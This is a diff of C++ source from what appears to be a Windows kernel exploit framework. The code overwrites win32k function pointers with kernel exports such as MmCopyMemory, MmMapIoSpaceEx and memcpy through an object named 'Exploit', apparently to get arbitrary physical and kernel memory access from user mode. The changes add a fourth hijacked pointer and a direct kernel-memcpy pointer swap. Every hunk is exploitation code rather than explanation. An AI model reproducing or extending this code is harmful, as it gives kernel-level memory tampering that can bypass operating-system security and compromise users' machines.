@@ -5,7 +5,7 @@ NTSTATUS Kernel::Initialize(bool Load) {
 
     // Initialize exploit or driver based on the Load flag
     if (!Load) {
-        Exploit = Syscall(PointerOne, PointerTwo, PointerThree);
+        Exploit = Syscall(PointerOne, PointerTwo, PointerThree, PointerFour);
         bIsExploitInit = true;
     }
     else {
@@ -44,7 +44,8 @@ NTSTATUS Kernel::Initialize(bool Load) {
         SwapPointer("MmCopyMemory", PointerOne.DataPtr);
         SwapPointer("MmMapIoSpaceEx", PointerTwo.DataPtr);
         SwapPointer("MmUnmapIoSpace", PointerThree.DataPtr);
-        Exploit = Syscall(PointerOne, PointerTwo, PointerThree);
+        SwapPointer("memcpy", PointerFour.DataPtr);
+        Exploit = Syscall(PointerOne, PointerTwo, PointerThree, PointerFour);
         bIsExploitInit = true;
     }
 
@@ -66,16 +67,7 @@ bool Kernel::WritePhysical(__int64 PhysicalAddr, void* Buffer, int size) {
     else return Exploit.WritePhysical(PhysicalAddr, Buffer, size);
 }
 
-template<class T>
-T Kernel::Read(__int64 PhysicalAddr) {
-    T Ret;
-    ReadPhysical(PhysicalAddr, &Ret, sizeof(Ret));
-    return Ret;
-}
-template<class T>
-void Kernel::Write(__int64 PhysicalAddr, T Buffer) {
-    WritePhysical(PhysicalAddr, &Buffer, sizeof(Buffer));
-}
+
 
 int Kernel::ProcessId(const char* Name, int Index) {
     int MatchedProcesses = 0;
@@ -262,6 +254,10 @@ void* Kernel::GetKernelAddress(const char* name)
 void Kernel::SwapPointer(const char* FunctionName, __int64 Offset) {
     __int64 ExportedAddress = KernelExport(FunctionName);
     Write<__int64>(TranslateLinearAddress(ExplorerDirectoryTable, win32kVirtual + Offset), ExportedAddress);
+}
+void Kernel::SwapPointer(__int64 Function, __int64 Offset) {
+    Exploit.K_memcpy((void*)(win32kVirtual + Offset), &Function, 8);
+
 }
 
 //https://github.com/waryas/UMPMLib/blob/9da1806e3ae3ab9778ce4df886a04ff33ade6c17/MemoryOperationSample/PMemHelper.h#L258
